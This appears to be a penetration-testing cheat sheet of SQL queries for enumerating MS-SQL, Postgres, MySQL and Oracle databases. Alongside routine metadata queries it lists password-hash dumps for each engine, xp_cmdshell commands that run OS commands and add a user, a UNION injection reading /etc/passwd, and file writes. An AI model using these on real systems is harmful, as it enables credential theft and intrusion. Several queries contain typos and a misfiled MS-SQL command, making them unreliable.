# DATABASE

1. [MS-SQL](#ms-sql)
2. [POSTGRES](#postgres)
3. [MYSQL](#mysql)
4. [ORACLE](#oracle)

## MS-SQL 

### DB version
```sql
SELECT @@version 
```

### Detailed version info
```sql
EXEC xp_msver 
```

### Run OS command
```sql
EXEC master..xp_cmdshell 'net user' 
```

### Hostname & IP
```sql
SELECT HOST_NAME() 
```

### Current DB
```sql
SELECT DB_NAME() 
```

### List DBs
```sql
SELECT name FROM master..sysdatabases; 
```

### Current user
```sql
SELECT user name() 
```

### List users
```sql
SELECT name FROM master..syslogins 
```

### List tables
```sql
SELECT name FROM master..sysobjects WHERE xtype='U'; 
```

### List columns
```sql
SELECT name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='mytable'); 
```

### SYSTEM TABLE CONTAINING INFO ON ALL TABLES

```sql
SELECT TOP 1 TABLE_NAME FROM INFORMATION SCHEMA.TABLES
```

### PASSWORD HASHES       (2005)

```sql
SELECT name, password_hash FROM master.sys.sql_logins
```


## POSTGRES 

### DB version
```sql
SELECT version(); 
```

### Hostname & IP
```sql
SELECT inet_server_addr(); 
```

### Current DB
```sql
SELECT current_database(); 
```

### List DBs
```sql
SELECT datname FROM pg_database; 
```

### Current user
```sql
SELECT user; 
```

### List users
```sql
SELECT username FROM pg_user; 
```

### List password hashes
```sql
SELECT username,passwd FROM pg_shadow 
```

### LIST COLUMNS

```sql
SELECT relname, A.attname FROM pg_class C, pg_namespace N, pg_attribute A,pg_type T WHERE (C.relkind='r') AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum>0) AND (NOT A.attisdropped) AND (N.nspname ILIKE 'public')
```

### LIST TABLES

```sql
SELECT c.relname FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind IN ('r','') AND n.nspname NOT IN ('pg catalog', 'pg_toast') AND pg_catalog.pg_table_is_visible(c.oid)
```


## MYSQL 

### DB version
```sql
SELECT @@version; 
```

### Hostname & IP
```sql
SELECT @@hostname; 
```

### Current DB
```sql
SELECT database(); 
```

### List DBs
```sql
SELECT distinct (db) FROM mysql.db; 
```

### Current user
```sql
SELECT user(); 
```

### List users
```sql
SELECT user FROM mysql.user; 
```

### List password hashes
```sql
SELECT host,user,password FROM mysql.user; 
```

### LIST ALL TABLES & COLUMNS

```sql
SELECT table_schema, table_name, column_name FROM information_scherna.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema'
```

### EXECUTE OS COMMAND THROUGH MYSQL

```sql
osql -S <ip>,<port> -U sa -P pwd -Q "exec xp_cmdshell 'net user /add user pass'"
```

### READ WORLD-READABLE FILES

```sql
UNION ALL SELECT LOAD FILE('/etc/passwd');
```

### WRITE TO FILE SYSTEM

```sql
SELECT * FROM mytable INTO dumpfile '/tmp/somefile';
```

### MYSQL LINUX

### Login to the Mysql server
```sql
mysql -u root -p 
```

```sql
mysql -u USER -pPASSWORD -h HOSTNAME -D DATABASE -e "SQL_QUERY"   #run mysql query
```


## ORACLE 

### DB version
```sql
SELECT * FROM v$version; 
```

### DB version
```sql
SELECT version FROM v$instance; 
```

### Current DB
```sql
SELECT instance_name FROM v$instance; 
```

### Current DB
```sql
SELECT name FROM v$database; 
```

### List DBs
```sql
SELECT DISTINCT owner FROM all_tables; 
```

### Current user
```sql
SELECT user FROM dual; 
```

### List users
```sql
SELECT username FROM all_users ORDER BY username; 
```

### List columns
```sql
SELECT column_name FROM all_tab_columns; 
```

### List tables
```sql
SELECT table_name FROM all_tables; 
```

### List password hashes
```sql
SELECT name, password, astatus FROM sys.user$; 
```

### LIST DBAs

```sql
SELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMIN_OPTION = 'YES';
```
